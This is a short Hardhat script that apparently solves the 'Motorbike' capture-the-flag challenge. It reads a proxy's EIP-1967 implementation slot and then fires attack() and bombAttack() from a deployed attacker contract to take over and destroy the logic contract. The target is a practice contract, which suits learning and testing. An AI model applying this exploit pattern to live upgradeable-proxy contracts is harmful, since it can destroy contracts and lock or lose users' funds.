import { ethers } from "hardhat";
import { attack } from "../typechain-types/contracts";

const CONTRACT_ADDRESS = "0xe3ADd897e69010709498738e5116C06B4D81e672"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0x8307C7C57D7FFCd1aB9A22cbDf2C45b67D8df463"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Motorbike", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("MotorbikeAttack", ATTACK_ADDRESS, signer)

  const address = await ethers.provider.getStorage(contract, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
  console.log(ethers.getAddress("0xa37ae2b259d35af4abdde122ec90b204323ed304"))

  await attackContract.attack()
  await attackContract.bombAttack()
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
